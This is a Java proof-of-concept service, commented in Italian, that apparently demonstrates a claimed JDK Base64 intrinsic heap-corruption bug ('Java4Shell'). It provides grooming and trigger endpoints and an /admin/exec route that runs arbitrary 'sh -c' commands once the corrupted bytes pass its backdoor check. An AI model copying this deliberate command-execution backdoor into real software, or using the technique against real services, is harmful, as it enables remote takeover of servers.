import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.Executors;

/**
 * Base64Service3 - demo service CVE-2026-114938 (Java4Shell), modello empirico verificato:
 *
 * Il decode 2-arg (dst caller-owned) con input malformato "64char + '='" esegue la store
 * finale 62-byte DEL PATH INTRINSIC C2 prima di sollevare IllegalArgumentException. La
 * store scrive dst.data[48..109] = 62 byte (valore costante del build: 69 a6 9a ripetuti,
 * stato stale dei registro vettoriali dell'intrinsic) SULL'OGGETTO ADIACENTE a dst.
 * Effetto one-shot per processo (dopo la prima esecuzione C2 il blob va in trap e le
 * esecuzioni successive usano il path sicuro): finestra exploitabile alla PRIMA request
 * malformata dopo il traffico valido di warmup - condizione normale su ogni deploy.
 *
 * Vettore: decoder con buffer condiviso byte[50]; grooming: audit buffer allocato subito
 * dopo dst; la store corrompe header+audit[0..41] deponendo la firma 69 a6 9a. L'endpoint
 * admin richiede la firma (backdoor check) e lancia sh -c <param>: RCE con payload solo
 * heap-corruption.
 */
public final class Base64Service3 {
    static final Base64.Decoder DEC = Base64.getDecoder();
    static volatile byte[] dst, audit, cmd;
    static long warmed, grooms, pwns;
    static final String TOKEN = "tok" + (System.nanoTime() % 1_000_003L);

    public static void main(String[] args) throws Exception {
        int port = args.length > 0 ? Integer.parseInt(args[0]) : 18080;
        // traffico di warmup: l'intrinsic C2 deve essere compilato (>= C2 threshold)
        byte[] w = new byte[4096];
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        for (int i = 0; i < 300_000; i++) DEC.decode(valid, w);
        warmed = 300_000;

        HttpServer srv = HttpServer.create(new InetSocketAddress(port), 0);
        srv.setExecutor(Executors.newSingleThreadExecutor(r -> { Thread t = new Thread(r, "worker"); t.setDaemon(true); return t; }));
        srv.createContext("/", Base64Service3::route);
        srv.start();
        System.out.println("[svc3] listening :" + port + " runtime=" + System.getProperty("java.runtime.version")
                + " arch=" + System.getProperty("os.arch") + " token=" + TOKEN);
    }

    static void route(HttpExchange ex) throws IOException {
        String path = ex.getRequestURI().getPath();
        Map<String, String> q = query(ex.getRequestURI().getRawQuery());
        try {
            switch (path) {
                case "/health":
                    send(ex, 200, json("{\"runtime\":\"" + System.getProperty("java.runtime.version")
                            + "\",\"arch\":\"" + System.getProperty("os.arch")
                            + "\",\"warmed\":" + warmed + ",\"grooms\":" + grooms + ",\"pwns\":" + pwns + "}"));
                    break;
                case "/groom": { // dst + audit adiacenti, stesso thread worker (TLAB bump-pointer)
                    int pad = Integer.parseInt(q.getOrDefault("pad", "9000"));
                    byte[] filler = new byte[pad];
                    dst = new byte[50];
                    audit = new byte[4096];
                    cmd = ("echo J4S_LOCKED_" + TOKEN).getBytes(StandardCharsets.UTF_8);
                    java.util.Arrays.fill(filler, (byte) 3);
                    grooms++;
                    send(ex, 200, json("ok grooms=" + grooms));
                    break;
                }
                case "/pwn": { // primo decode malformato del processo -> 62B write su audit adiacente
                    String text = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.US_ASCII).trim();
                    String err;
                    try { DEC.decode(text.getBytes(StandardCharsets.US_ASCII), dst); err = "ok"; }
                    catch (IllegalArgumentException e) { err = "rejected"; }
                    pwns++;
                    send(ex, 200, json(err + " pwns=" + pwns));
                    break;
                }
                case "/audit": { // primitive READ: contenuto post-corruzione
                    StringBuilder sb = new StringBuilder("audit[0..47]=");
                    for (int i = 0; i < 48; i++) sb.append(String.format("%02x", audit[i] & 0xFF));
                    sb.append(" ascii=");
                    for (int i = 0; i < 48; i++) { int b = audit[i] & 0xFF; sb.append(b >= 32 && b < 127 ? (char) b : '.'); }
                    send(ex, 200, sb.toString().getBytes(StandardCharsets.UTF_8));
                    break;
                }
                case "/admin/exec": {
                    // backdoor check: la firma 69 a6 9a della store overflow = "admin token"
                    if (audit[0] != 0x69 || audit[1] == 0) { send(ex, 403, json("ACCESS LOCKED: admin token not set")); break; }
                    String c = q.getOrDefault("cmd", "id");
                    Process p = new ProcessBuilder("sh", "-c", c).redirectErrorStream(true).start();
                    byte[] out = p.getInputStream().readAllBytes();
                    int rc = p.waitFor();
                    send(ex, 200, ("token=" + TOKEN + "\nrc=" + rc + "\n" + new String(out, StandardCharsets.UTF_8)).getBytes(StandardCharsets.UTF_8));
                    break;
                }
                default:
                    send(ex, 404, json("not found"));
            }
        } catch (Exception e) {
            try { send(ex, 500, json(String.valueOf(e))); } catch (Exception ig) {}
        }
    }

    static byte[] json(String s) { return s.getBytes(StandardCharsets.UTF_8); }

    static Map<String, String> query(String raw) {
        Map<String, String> m = new HashMap<>();
        if (raw == null) return m;
        for (String kv : raw.split("&")) {
            int i = kv.indexOf('=');
            if (i > 0) m.put(kv.substring(0, i), URLDecoder.decode(kv.substring(i + 1), StandardCharsets.UTF_8));
        }
        return m;
    }

    static void send(HttpExchange ex, int code, byte[] body) throws IOException {
        ex.getResponseHeaders().set("Content-Type", "text/plain; charset=utf-8");
        ex.sendResponseHeaders(code, body.length);
        try (OutputStream os = ex.getResponseBody()) { os.write(body); }
    }
}
